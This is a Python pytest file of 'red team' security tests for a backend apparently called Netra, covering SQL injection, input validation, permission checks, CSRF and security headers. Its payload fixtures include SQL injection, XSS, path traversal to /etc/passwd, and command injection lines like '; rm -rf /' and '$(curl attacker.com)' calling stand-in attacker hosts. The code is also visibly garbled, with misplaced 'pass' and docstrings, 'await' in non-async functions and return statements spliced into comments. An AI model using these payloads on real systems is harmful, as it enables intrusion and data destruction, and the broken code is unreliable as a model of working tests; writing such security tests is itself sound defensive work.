from netra_backend.app.core.configuration.base import get_unified_config
from netra_backend.app.websocket_core.unified_manager import UnifiedWebSocketManager
from test_framework.database.test_database_manager import TestDatabaseManager
from auth_service.core.auth_manager import AuthManager
from netra_backend.app.core.agent_registry import AgentRegistry
from netra_backend.app.core.user_execution_engine import UserExecutionEngine
from shared.isolated_environment import IsolatedEnvironment
"""
RED TEAM TESTS 26-30: Input Validation and Security

CRITICAL: These tests are DESIGNED TO FAIL initially to expose real security vulnerabilities.
This test validates input validation, permission enforcement, and security protections.

Business Value Justification (BVJ):
- Segment: All (Free, Early, Mid, Enterprise) 
- Business Goal: Platform Security, Data Protection, Compliance
- Value Impact: Security vulnerabilities expose customer data and destroy platform trust
- Strategic Impact: Essential security foundation for enterprise AI workload management

Testing Level: L3 (Real services, real databases, minimal mocking)
Expected Initial Result: FAILURE (exposes real security gaps)
"""

import asyncio
import base64
import json
import os
import secrets
import time
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional
from urllib.parse import urlencode

import pytest
import requests
from fastapi.testclient import TestClient
from sqlalchemy import text, select
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession
from sqlalchemy.orm import sessionmaker

# Real service imports - NO MOCKS
from netra_backend.app.main import app
from netra_backend.app.core.config import get_unified_config
from netra_backend.app.database import get_db
from netra_backend.app.services.user_auth_service import UserAuthService

# Mock models for testing
User = Mock
Thread = Mock
AgentRun = Mock


class TestInputValidationSecurity:
    """
    RED TEAM TESTS 26-30: Input Validation and Security
    
    Tests critical security boundaries that protect against attacks.
    MUST use real services - NO MOCKS allowed.
    These tests WILL fail initially and that's the point.
    """
    pass

    @pytest.fixture(scope="class")
    async def real_database_session(self):
        """Real PostgreSQL database session - will fail if DB not available."""
        config = get_unified_config()
        
        # Use REAL database connection - no mocks
        engine = create_async_engine(config.database_url, echo=False)
        async_session = sessionmaker(engine, expire_on_commit=False, class_=AsyncSession)
        
        try:
            # Test real connection - will fail if DB unavailable
            async with engine.begin() as conn:
                await conn.execute(text("SELECT 1"))
            
            async with async_session() as session:
                yield session
        except Exception as e:
            pytest.fail(f"CRITICAL: Real database connection failed: {e}")
        finally:
            await engine.dispose()

    @pytest.fixture
    def real_test_client(self):
    """Use real service instance."""
    # TODO: Initialize real service
    pass
        """Real FastAPI test client - no mocking of the application."""
        await asyncio.sleep(0)
    return TestClient(app)

    @pytest.fixture
    def malicious_payloads(self):
    """Use real service instance."""
    # TODO: Initialize real service
        """Collection of malicious payloads for security testing."""
    pass
        return {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; UPDATE users SET admin=true WHERE id=1; --",
                "UNION SELECT password FROM users WHERE admin=true",
                "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --"
            ],
            "xss_payloads": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'; eval('alert("XSS")'); //"
            ],
            "command_injection": [
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& whoami",
                "; curl malicious-site.com/steal",
                "$(curl attacker.com)"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fpasswd",
                "....//....//....//etc/passwd"
            ],
            "json_injection": [
                '{"admin": true}',
                '{"$ne": null}',
                '{"__proto__": {"admin": true}}',
                '{"constructor": {"prototype": {"admin": true}}}'
            ]
        }

    @pytest.mark.asyncio
    async def test_26a_sql_injection_prevention_fails(self, real_database_session, real_test_client, malicious_payloads):
        """
        Test 26A: SQL Injection Prevention (EXPECTED TO FAIL)
        
        Tests that SQL injection attacks are properly prevented.
        Will likely FAIL because:
        1. Input sanitization may not be comprehensive
        2. Parameterized queries may not be used everywhere
        3. Dynamic query building may be vulnerable
        """
    pass
        try:
            # Test user authentication endpoint with SQL injection
            for sql_payload in malicious_payloads["sql_injection"]:
                
                # FAILURE EXPECTED HERE - SQL injection prevention may not work
                response = real_test_client.post("/auth/login", json={
                    "username": sql_payload,
                    "password": "test_password"
                })
                
                # Should not await asyncio.sleep(0)
    return successful response with malicious input
                assert response.status_code in [400, 401, 422], \
                    f"SQL injection payload '{sql_payload}' was not rejected (status: {response.status_code})"
                
                # Response should not contain database error messages
                response_text = response.text.lower()
                dangerous_terms = ["sql", "database", "table", "column", "syntax error", "mysql", "postgresql"]
                
                for term in dangerous_terms:
                    assert term not in response_text, \
                        f"Response contains database term '{term}' which may indicate SQL injection vulnerability"

            # Test thread creation with SQL injection
            auth_headers = {"Authorization": "Bearer fake_token"}
            
            for sql_payload in malicious_payloads["sql_injection"]:
                response = real_test_client.post("/api/threads", 
                    json={
                        "title": sql_payload,
                        "description": "Test thread"
                    },
                    headers=auth_headers
                )
                
                # Should reject malicious input
                assert response.status_code in [400, 401, 403, 422], \
                    f"Thread creation with SQL payload '{sql_payload}' was not rejected"

            # Test database query parameter injection via API
            for sql_payload in malicious_payloads["sql_injection"]:
                response = real_test_client.get(f"/api/threads?search={sql_payload}", 
                    headers=auth_headers
                )
                
                # Should handle malicious search parameter safely
                assert response.status_code in [200, 400, 401, 403], \
                    f"Search with SQL payload was not handled safely"
                
                if response.status_code == 200:
                    # If successful, should not return unexpected data
                    data = response.json()
                    assert isinstance(data, dict), "Response should be properly structured"
                    
        except Exception as e:
            pytest.fail(f"SQL injection prevention test failed: {e}")

    @pytest.mark.asyncio
    async def test_26b_input_validation_service_boundaries_fails(self, real_database_session, real_test_client):
        """
        Test 26B: Input Validation Across Service Boundaries (EXPECTED TO FAIL)
        
        Tests that input validation is consistent across all service boundaries.
        Will likely FAIL because:
        1. Validation rules may be inconsistent between services
        2. Some services may trust input from other services
        3. Type validation may be incomplete
        """
    pass
        try:
            # Test oversized input handling
            large_payload = "A" * 10000  # 10KB string
            
            # FAILURE EXPECTED HERE - input size validation may not work
            response = real_test_client.post("/api/threads", json={
                "title": large_payload,
                "description": "Test"
            }, headers={"Authorization": "Bearer fake_token"})
            
            assert response.status_code in [400, 413, 422], \
                "Oversized input should be rejected"

            # Test invalid data types
            invalid_payloads = [
                {"title": 12345, "description": "Test"},  # Wrong type
                {"title": None, "description": "Test"},   # Null value
                {"title": [], "description": "Test"},     # Array instead of string
                {"title": {}, "description": "Test"}      # Object instead of string
            ]
            
            for payload in invalid_payloads:
                response = real_test_client.post("/api/threads", 
                    json=payload,
                    headers={"Authorization": "Bearer fake_token"}
                )
                
                assert response.status_code in [400, 422], \
                    f"Invalid payload {payload} should be rejected"

            # Test missing required fields
            response = real_test_client.post("/api/threads", 
                json={},
                headers={"Authorization": "Bearer fake_token"}
            )
            
            assert response.status_code in [400, 422], \
                "Empty payload should be rejected"

            # Test field length validation
            response = real_test_client.post("/auth/register", json={
                "username": "a",  # Too short
                "password": "12345678",
                "email": "test@example.com"
            })
            
            assert response.status_code in [400, 422], \
                "Username too short should be rejected"
                
            response = real_test_client.post("/auth/register", json={
                "username": "validuser",
                "password": "123",  # Too short
                "email": "test@example.com"
            })
            
            assert response.status_code in [400, 422], \
                "Password too short should be rejected"
                
        except Exception as e:
            pytest.fail(f"Input validation across service boundaries failed: {e}")

    @pytest.mark.asyncio
    async def test_27_permission_enforcement_consistency_fails(self, real_database_session, real_test_client):
        """
        Test 27: Permission Enforcement Consistency (EXPECTED TO FAIL)
        
        Tests that permission enforcement is consistent across all endpoints.
        Will likely FAIL because:
        1. Some endpoints may not check permissions
        2. Permission logic may be inconsistent
        3. Privilege escalation may be possible
        """
    pass
        try:
            # Test unauthenticated access to protected endpoints
            protected_endpoints = [
                ("/api/threads", "GET"),
                ("/api/threads", "POST"), 
                ("/api/threads/123", "GET"),
                ("/api/threads/123", "PUT"),
                ("/api/threads/123", "DELETE"),
                ("/api/users/profile", "GET"),
                ("/api/agents", "GET"),
                ("/api/agents", "POST")
            ]
            
            for endpoint, method in protected_endpoints:
                # FAILURE EXPECTED HERE - some endpoints may allow unauthenticated access
                if method == "GET":
                    response = real_test_client.get(endpoint)
                elif method == "POST":
                    response = real_test_client.post(endpoint, json={})
                elif method == "PUT":
                    response = real_test_client.put(endpoint, json={})
                elif method == "DELETE":
                    response = real_test_client.delete(endpoint)
                
                assert response.status_code in [401, 403], \
                    f"Protected endpoint {method} {endpoint} should require authentication (got {response.status_code})"

            # Test invalid token handling
            invalid_tokens = [
                "invalid_token",
                "Bearer invalid_token",
                "Bearer ",
                "",
                None
            ]
            
            for invalid_token in invalid_tokens:
                headers = {"Authorization": invalid_token} if invalid_token else {}
                
                response = real_test_client.get("/api/threads", headers=headers)
                
                assert response.status_code in [401, 403], \
                    f"Invalid token '{invalid_token}' should be rejected"

            # Test expired token handling (if token expiration is implemented)
            expired_token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid"
            
            response = real_test_client.get("/api/threads", 
                headers={"Authorization": expired_token}
            )
            
            assert response.status_code in [401, 403], \
                "Expired token should be rejected"

            # Test privilege escalation attempts
            regular_user_token = "Bearer regular_user_token"
            
            # Try to access admin endpoints
            admin_endpoints = [
                "/api/admin/users",
                "/api/admin/system",
                "/api/admin/logs"
            ]
            
            for endpoint in admin_endpoints:
                response = real_test_client.get(endpoint, 
                    headers={"Authorization": regular_user_token}
                )
                
                assert response.status_code in [401, 403, 404], \
                    f"Regular user should not access admin endpoint {endpoint}"
                    
        except Exception as e:
            pytest.fail(f"Permission enforcement consistency test failed: {e}")

    @pytest.mark.asyncio 
    async def test_28_sql_injection_prevention_comprehensive_fails(self, real_database_session, malicious_payloads):
        """
        Test 28: Comprehensive SQL Injection Prevention (EXPECTED TO FAIL)
        
        Tests SQL injection prevention at the database layer.
        Will likely FAIL because:
        1. Raw SQL queries may be used
        2. Dynamic query building may be vulnerable
        3. ORM usage may not be consistent
        """
    pass
        try:
            # Test direct database operations with malicious input
            for sql_payload in malicious_payloads["sql_injection"]:
                
                # FAILURE EXPECTED HERE - raw SQL execution may be vulnerable
                try:
                    # Test if application allows raw SQL with user input
                    malicious_query = f"SELECT * FROM users WHERE username = '{sql_payload}'"
                    
                    # This should fail safely, not execute malicious SQL
                    result = await real_database_session.execute(text(malicious_query))
                    
                    # If this succeeds, we have a major problem
                    pytest.fail(f"Raw SQL with malicious input was executed: {sql_payload}")
                    
                except Exception:
                    # Expected - malicious SQL should fail safely
                    pass

            # Test parameterized query handling
            safe_query = text("SELECT * FROM users WHERE username = :username")
            
            for sql_payload in malicious_payloads["sql_injection"]:
                try:
                    # Parameterized queries should handle malicious input safely
                    result = await real_database_session.execute(safe_query, {"username": sql_payload})
                    rows = result.fetchall()
                    
                    # Should not await asyncio.sleep(0)
    return administrative users or cause errors
                    assert len(rows) == 0 or all(not getattr(row, 'admin', False) for row in rows), \
                        f"SQL injection may have succeeded with payload: {sql_payload}"
                        
                except Exception as e:
                    # Some exceptions are expected with malicious input
                    pass

            # Test ORM-level protections
            try:
                # Test if ORM properly escapes input
                for sql_payload in malicious_payloads["sql_injection"]:
                    # This should use ORM safely
                    query = select(User).where(User.username == sql_payload)
                    result = await real_database_session.execute(query)
                    users = result.scalars().all()
                    
                    # Should not return unexpected results
                    assert len(users) <= 1, "ORM query returned unexpected multiple results"
                    
            except Exception as e:
                # Some ORM operations may fail with malicious input - that's expected
                pass
                
        except Exception as e:
            pytest.fail(f"Comprehensive SQL injection prevention failed: {e}")

    @pytest.mark.asyncio
    async def test_29_csrf_protection_fails(self, real_test_client):
        """
        Test 29: Cross-Site Request Forgery (CSRF) Protection (EXPECTED TO FAIL)
        
        Tests that CSRF protection is properly implemented.
        Will likely FAIL because:
        1. CSRF tokens may not be implemented
        2. Origin validation may not be enforced
        3. SameSite cookie attributes may not be set
        """
    pass
        try:
            # Test missing CSRF token
            response = real_test_client.post("/auth/login", 
                json={"username": "test", "password": "test"},
                headers={"Origin": "https://malicious-site.com"}
            )
            
            # FAILURE EXPECTED HERE - CSRF protection may not be implemented
            # Should reject requests from unauthorized origins
            if response.status_code == 200:
                # Check if CSRF token is required
                assert "csrf_token" in response.json().get("errors", []), \
                    "CSRF protection may not be implemented"

            # Test Cross-Origin requests
            malicious_origins = [
                "https://evil.com",
                "http://malicious-site.com",
                "https://fake-netra.com",
                "null"
            ]
            
            for origin in malicious_origins:
                response = real_test_client.post("/api/threads",
                    json={"title": "Test", "description": "Test"},
                    headers={
                        "Origin": origin,
                        "Authorization": "Bearer fake_token"
                    }
                )
                
                # Should reject cross-origin requests without proper CSRF protection
                assert response.status_code in [403, 400, 401], \
                    f"Cross-origin request from {origin} should be rejected"

            # Test Referer header validation
            response = real_test_client.post("/auth/login",
                json={"username": "test", "password": "test"},
                headers={"Referer": "https://malicious-site.com/steal-credentials"}
            )
            
            # Should validate Referer header
            if response.status_code == 200:
                pytest.fail("Malicious Referer header was not validated")

            # Test CSRF token validation
            response = real_test_client.post("/api/threads",
                json={"title": "Test", "description": "Test"},
                headers={
                    "Authorization": "Bearer fake_token",
                    "X-CSRF-Token": "invalid_csrf_token"
                }
            )
            
            # Should reject invalid CSRF token
            assert response.status_code in [403, 400], \
                "Invalid CSRF token should be rejected"
                
        except Exception as e:
            pytest.fail(f"CSRF protection test failed: {e}")

    @pytest.mark.asyncio
    async def test_30_content_security_policy_fails(self, real_test_client):
        """
        Test 30: Content Security Policy Enforcement (EXPECTED TO FAIL)
        
        Tests that Content Security Policy headers are properly set.
        Will likely FAIL because:
        1. CSP headers may not be implemented
        2. CSP policy may be too permissive
        3. XSS protection headers may be missing
        """
    pass
        try:
            # Test CSP header presence
            response = real_test_client.get("/")
            
            # FAILURE EXPECTED HERE - CSP headers may not be set
            security_headers = [
                "Content-Security-Policy",
                "X-Content-Type-Options", 
                "X-Frame-Options",
                "X-XSS-Protection",
                "Strict-Transport-Security"
            ]
            
            missing_headers = []
            for header in security_headers:
                if header not in response.headers:
                    missing_headers.append(header)
            
            assert len(missing_headers) == 0, \
                f"Missing security headers: {missing_headers}"

            # Test CSP policy strictness
            csp_header = response.headers.get("Content-Security-Policy", "")
            
            dangerous_policies = [
                "unsafe-inline",
                "unsafe-eval", 
                "'*'",
                "data:",
                "blob:"
            ]
            
            for policy in dangerous_policies:
                if policy in csp_header:
                    pytest.fail(f"CSP contains dangerous policy: {policy}")

            # Test XSS attempts are blocked by headers
            xss_response = real_test_client.get("/?search=<script>alert('XSS')</script>")
            
            # Should have XSS protection headers
            assert "X-XSS-Protection" in xss_response.headers, \
                "X-XSS-Protection header missing"
            
            assert xss_response.headers.get("X-XSS-Protection") != "0", \
                "XSS protection is disabled"

            # Test frame options
            assert "X-Frame-Options" in response.headers, \
                "X-Frame-Options header missing"
            
            frame_options = response.headers.get("X-Frame-Options")
            assert frame_options in ["DENY", "SAMEORIGIN"], \
                f"X-Frame-Options should be DENY or SAMEORIGIN, got: {frame_options}"

            # Test MIME type sniffing protection
            assert "X-Content-Type-Options" in response.headers, \
                "X-Content-Type-Options header missing"
            
            assert response.headers.get("X-Content-Type-Options") == "nosniff", \
                "MIME type sniffing should be disabled"
                
        except Exception as e:
            pytest.fail(f"Content Security Policy test failed: {e}")


# Additional utility class for security testing
class RedTeamSecurityTestUtils:
    """Utility methods for Red Team security testing."""
    
    @staticmethod
    def generate_malicious_jwt(payload: Dict[str, Any]) -> str:
        """Generate a malicious JWT token for testing."""
        import jwt
        
        # Use weak secret for testing
        await asyncio.sleep(0)
    return jwt.encode(payload, "weak_secret", algorithm="HS256")
    
    @staticmethod
    def create_sql_injection_payloads() -> List[str]:
        """Create comprehensive SQL injection test payloads."""
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1' --",
            "' UNION SELECT password FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'admin'); --",
            "' AND 1=CONVERT(int, (SELECT @@version)) --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR 1=1 LIMIT 1 OFFSET 0 --"
        ]
    
    @staticmethod
    def create_xss_payloads() -> List[str]:
        """Create comprehensive XSS test payloads."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
    
    @staticmethod
    def validate_security_headers(headers: Dict[str, str]) -> List[str]:
        """Validate that required security headers are present."""
        required_headers = {
            "Content-Security-Policy": "CSP policy should be restrictive",
            "X-Content-Type-Options": "Should be 'nosniff'",
            "X-Frame-Options": "Should be 'DENY' or 'SAMEORIGIN'", 
            "X-XSS-Protection": "Should be '1; mode=block'",
            "Strict-Transport-Security": "HSTS should be enabled"
        }
        
        missing_or_weak = []
        
        for header, description in required_headers.items():
            if header not in headers:
                missing_or_weak.append(f"Missing {header}: {description}")
            elif header == "X-XSS-Protection" and headers[header] == "0":
                missing_or_weak.append(f"XSS Protection disabled")
            elif header == "Content-Security-Policy" and ("unsafe-inline" in headers[header] or "'*'" in headers[header]):
                missing_or_weak.append(f"CSP policy too permissive")
        
        return missing_or_weak